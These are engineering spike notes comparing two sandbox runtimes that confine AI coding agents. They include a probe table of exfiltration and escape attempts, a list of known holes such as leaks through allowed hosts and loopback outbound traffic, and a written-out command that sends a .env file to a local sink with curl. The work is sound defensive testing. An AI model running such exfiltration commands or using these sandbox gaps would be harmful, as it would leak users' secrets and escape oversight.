# P0 spikes S1–S3 (2026-10-15)

Receipts only: commands, exit codes, decisions. Tier T0 on the host with a fake `HOME`,
canary strings and `127.0.0.1` sinks. No real secret, account or non-localhost sink was used.

Host: macOS 26.6.2, Apple silicon. Floor: `@anthropic-ai/sandbox-runtime` 0.0.79 (pinned in
`tools/package.json`). Comparator: Fence 0.1.67 (Homebrew core, built 2026-09-01).

Decisions from S1:

- Codex runs inside the floor with `-s danger-full-access` (its Seatbelt cannot nest). This is
  set per invocation, never in `~/.codex/config.toml`.
- Policy gains two explicit, default-off flags: `weaker_network_isolation` (codex; trustd is a
  documented exfil path) and `allow_local_binding` (agy; loopback then bypasses the proxy). Both
  are logged as residuals when on.
- Vendor state paths are writable (`~/.claude`, `~/.claude.json*`, `~/.codex`,
  `~/.gemini/antigravity*`). Vendor config files stay in `PROTECTED_WRITE`.
- `ENV_NEVER` needs no vendor exception list.
- Residual: Claude OAuth token refresh fails inside the floor (likely Keychain write; unverified,
  confidence 60). `ANTHROPIC_API_KEY` auth is out of scope for week 1.
- srt refuses to run without a `--settings` file (fail-closed) and needs absolute paths.
- `npm audit` reports 2 high findings in `node-forge` (an srt dependency). Tracked under N5.

## S2: can the Python parent observe allowed connections?

Verdict: **yes, via `network.parentProxy`**. This is the M2 design.

| Option | Result |
|---|---|
| `--debug` stderr "Allowed by config rule" | observable but mixed with child stderr; child can forge it. Rejected |
| violation store | denies only. Insufficient |
| `srt proxy` external decider | not present in 0.0.79 |
| `filterRequest` | library API only, not CLI |
| `mitmProxy {socketPath, domains}` | per-domain TLS MITM; heavier than needed. Deferred |
| **`parentProxy {http, https}` → Python proxy on 127.0.0.1** | **parent saw every allowed request** |

Receipt (`docs/spikes/s2-parent-proxy.py`, allowlist `sink.invalid` only; parent answers 502, no
real egress):

| Child command | Exit / code | Parent log |
|---|---|---|
| `curl http://sink.invalid/a` | 502 | `GET http://sink.invalid/a` |
| `curl https://sink.invalid/b` | 000 | `CONNECT sink.invalid:443` |
| `curl http://denied.invalid/c` | 403 from srt | nothing (denied before the parent) |

So the parent sees host and port for allowed traffic and can refuse it, which is what taint-gated
egress needs. Denied traffic never reaches the parent.

## S3: srt vs Fence on the probe set

Harness: `docs/spikes/s3/probes.sh MODE` with `sink.py`. A fake `HOME` lives under `~/.af-s3`
(outside `/tmp` so `/tmp` allowances do not mask writes) and is deleted after the run. `none` is the
control and shows every probe can leak without a floor. srt uses a P1-shaped policy; Fence uses its
shipped `code` template unchanged. `pbcopy` is skipped (`needs-T1`, would touch the real pasteboard).

| Probe | none (control) | srt 0.0.79 | Fence 0.1.67 `code` |
|---|---|---|---|
| ssh-read | leak | blocked | blocked |
| env-read | leak | blocked | **leak** (`.env` not in denyRead) |
| cfg-write (`~/.zshrc`) | written | blocked | blocked |
| claude-settings-write | written | blocked | **written** (`~/.claude/**` writable) |
| git-hook-write | written | blocked | blocked |
| symlink-escape | leak | blocked | blocked |
| dotdot-escape | leak | blocked | blocked |
| icloud-write | written | blocked | blocked |
| http-denied | n/a (no DNS) | blocked (403) | blocked |
| dns-exfil (raw UDP to loopback sink) | leak | blocked | **leak** (`allowLocalOutbound`) |
| git-push-sink | reached sink | blocked (network) | blocked (command deny list) |
| instruction-write (`AGENTS.md`) | written | written (expected: allowed_logged) | written |
| allowed-host-exfil | leak | **leak** (known hole) | **leak** (known hole) |

Taint test (the Q1 pre-mortem trigger): under Fence `code`, `cat .env && curl -d @.env
http://127.0.0.1:PORT/t` returned 404 from the sink with exit 0, and the sink logged the `.env`
canary. A string scan of the Fence binary finds no taint or quarantine feature.

**Decision: keep srt as the floor; Fence stays the comparator.**

- Fence does not flip allowed hosts after a secret read, so pre-mortem item 1 did not fire. No Q1
  rerun and no pivot.
- The engines are close: both are Seatbelt plus a proxy. Fence's extra layer is a command deny
  list, which caught `git push`. Its template gaps (`.env` read, `~/.claude/**` write, loopback
  outbound) are configuration, not engine limits.
- srt wins on `parentProxy` (S2), on being the floor Claude Code itself ships, and on refusing to
  run without settings. Fence's command deny list is noted as a candidate idea for P2, not
  adopted.
- Both floors leak to an allowed host. That hole is the reason for M2 and stays in the README.
